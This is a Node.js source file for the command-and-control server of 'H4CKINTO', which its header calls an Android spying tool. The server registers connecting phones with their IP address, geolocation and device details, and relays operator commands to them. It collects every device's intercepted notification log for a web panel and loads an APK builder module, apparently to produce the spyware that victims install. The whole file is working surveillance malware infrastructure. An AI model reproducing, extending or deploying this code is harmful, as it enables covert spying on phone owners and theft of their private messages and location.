/*
 *   H4CKINTO
 *   An Android Spying Tool
 *   By Piyush Banik
 */

const express = require('express'),
	app = express(),
	server = require('http').createServer(app),
	IO = require('socket.io')(server, {
		// Increase timeouts and buffer sizes for large data operations
		pingTimeout: 120000,          // 120s timeout for large file transfers
		pingInterval: 25000,          // Send ping every 25s to keep alive
		upgradeTimeout: 30000,        // 30s for websocket upgrade
		maxHttpBufferSize: 50e6,      // 50MB buffer for large chunks (was 10MB)
		transports: ['websocket', 'polling'], // Prefer websocket, fallback to polling
		allowEIO3: true               // Allow older clients
	}),
	path = require('path'),
	geoip = require('geoip-lite'),
	CONST = require(path.join(__dirname, '/includes/const')),
	db = require(path.join(__dirname, '/includes/databaseGateway')),
	logManager = require(path.join(__dirname, '/includes/logManager')),
	clientManager = new (require(path.join(__dirname, '/includes/clientManager')))(db),
	apkBuilder = require(path.join(__dirname, '/includes/apkBuilder'));
port = 4444;

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;
global.static_ip = process.env.STATIC_IP || "0.0.0.0";
global.IO = IO; // Make IO accessible globally for broadcasting
// spin up socket server
// Socket.IO keepalive and buffer settings configured above

IO.on('connection', (socket) => {
	socket.emit('welcome');
	let clientParams = socket.handshake.query;
	let clientAddress = socket.request.connection;

	let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
	let clientGeo = geoip.lookup(clientIP);
	if (!clientGeo) clientGeo = {};

	// Check if this is a web panel connection (not an Android client)
	// Web panel connections:
	// 1. Don't have device info (model, manf, release)
	// 2. Don't provide a client ID
	// 3. May have a 'type' parameter set to 'web' or 'webpanel'
	const hasDeviceInfo = clientParams.model && clientParams.model !== 'undefined' &&
	                     clientParams.manf && clientParams.manf !== 'undefined' &&
	                     clientParams.release && clientParams.release !== 'undefined';
	const isWebPanel = (clientParams.type === 'web' || clientParams.type === 'webpanel') ||
	                   (!clientParams.id && !hasDeviceInfo);

	if (isWebPanel) {
		// This is a web panel connection - don't register as a client
		console.log('🌐 Web panel connected from:', clientIP);
		// Set a flag to identify this as a web panel connection
		socket.isWebPanel = true;
	} else {
		// This is an Android client connection
	// Generate a client ID if none provided
	let clientId = clientParams.id;
	if (!clientId || clientId === 'undefined') {
		clientId = 'android_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
		console.log('Generated client ID:', clientId);
	}

		// Only register as a client if it's actually an Android device
	clientManager.clientConnect(socket, clientId, {
		clientIP,
		clientGeo,
		device: {
			model: clientParams.model || 'Unknown',
			manufacture: clientParams.manf || 'Unknown',
			version: clientParams.release || 'Unknown',
		},
	});

	socket.on('register', (data) => {
		try {
			if (data && typeof data === 'object' && !Array.isArray(data)) {
				clientManager.mergeDeviceReport(clientId, data);
			}
		} catch (err) {
			console.error('register handler:', err);
		}
	});
	}

	// Handle command requests
	socket.on('send_command', (data) => {
		console.log('Received command request:', data);
		if (data.clientID && data.command) {
			clientManager.sendCommand(data.clientID, data.command.type, data.command);
		}
	});

	// Handle get all notifications from database request (for web panel)
	socket.on('get_all_notifications_from_db', (data, callback) => {
		try {
			console.log('📋 Request for all notifications from database (clientData/*.json)');
			
			// Get all notifications from client databases
			const allNotifications = [];
			const clients = db.maindb.get('clients').value();
			console.log(`📊 Found ${clients.length} clients in database`);
			
			clients.forEach((client, index) => {
				const clientID = client.clientID;
				console.log(`📱 Client ${index + 1}: ${clientID}`);
				
				try {
					// Access client-specific database
					const clientDB = clientManager.getClientDatabase(clientID);
					const notificationLog = clientDB.get('notificationLog').value();
					
					console.log(`   - notificationLog length: ${notificationLog ? notificationLog.length : 0}`);
					
					if (notificationLog && Array.isArray(notificationLog)) {
						notificationLog.forEach(notification => {
							// Add client ID to notification
							notification.clientID = clientID;
							allNotifications.push(notification);
						});
					}
				} catch (error) {
					console.error(`   ❌ Error accessing client database for ${clientID}:`, error.message);
				}
			});
			
			// Sort by timestamp (newest first)
			allNotifications.sort((a, b) => (b.timestamp || b.postTime || 0) - (a.timestamp || a.postTime || 0));
			
			console.log(`📊 Found ${allNotifications.length} stored notifications from all devices in database`);
			
			// Send response
			if (callback) {
				callback({
					success: true,
					notifications: allNotifications,
					count: allNotifications.length,
					source: 'clientData/*.json'
				});
			}
			
		} catch (error) {
			console.error('❌ Error getting all notifications from database:', error);
			if (callback) {
				callback({
					success: false,
					error: error.message,
					notifications: [],
					count: 0,
					source: 'clientData/*.json'
				});
			}
		}
	});

	// Handle get all notifications request (for web panel)
	socket.on('get_all_notifications', (data, callback) => {
		try {
			console.log('📊 Web panel requesting all notifications...');
			const allNotifications = [];
			const clients = db.maindb.get('clients').value();
			
			console.log('📊 Found', clients.length, 'clients in database');
			
			clients.forEach(client => {
				const clientID = client.clientID;
				try {
					// Access client-specific database
					const clientDB = clientManager.getClientDatabase(clientID);
					const notificationLog = clientDB.get('notificationLog').value();
					
					if (notificationLog && Array.isArray(notificationLog)) {
						console.log('📊 Client', clientID, 'has', notificationLog.length, 'notifications');
						notificationLog.forEach(notification => {
							notification.clientID = clientID;
							allNotifications.push(notification);
						});
					} else {
						console.log('⚠️ Client', clientID, 'has no notificationLog or invalid format');
					}
				} catch (error) {
					console.error(`❌ Error accessing client database for ${clientID}:`, error.message);
				}
			});
			
			// Sort by timestamp (newest first)
			allNotifications.sort((a, b) => {
				const timeA = new Date(a.timestamp || a.receivedTime || 0);
				const timeB = new Date(b.timestamp || b.receivedTime || 0);
				return timeB - timeA;
			});
			
			console.log('📊 Total notifications found:', allNotifications.length);
			
			if (callback) {
				callback({
					success: true,
					notifications: allNotifications,
					count: allNotifications.length
				});
			}
		} catch (error) {
			console.error('❌ Error getting all notifications:', error);
			if (callback) {
				callback({
					success: false,
					error: error.message,
					notifications: [],
					count: 0
				});
			}
		}
	});

	// Handle test connection (for web panel debugging)
	socket.on('test_connection', (data, callback) => {
		console.log('🧪 Test connection received from web panel:', data);
		if (callback) {
			callback({
				success: true,
				message: 'Web panel connection test successful',
				timestamp: new Date().toISOString()
			});
		}
	});

	if (CONST.debug) {
		var onevent = socket.onevent;
		socket.onevent = function (packet) {
			var args = packet.data || [];
			onevent.call(this, packet); // original call
			packet.data = ['*'].concat(args);
			onevent.call(this, packet); // additional call to catch-all
		};

		socket.on('*', function (event, data) {
			console.log(event);
			console.log(data);
		});
	}
});

// get the admin interface online
// app.listen(CONST.web_port);
server.listen(port, '0.0.0.0', () => console.log(`listening on port ${static_ip}:${port}`));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '/assets/views'));
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require(path.join(__dirname, '/includes/expressRoutes')));
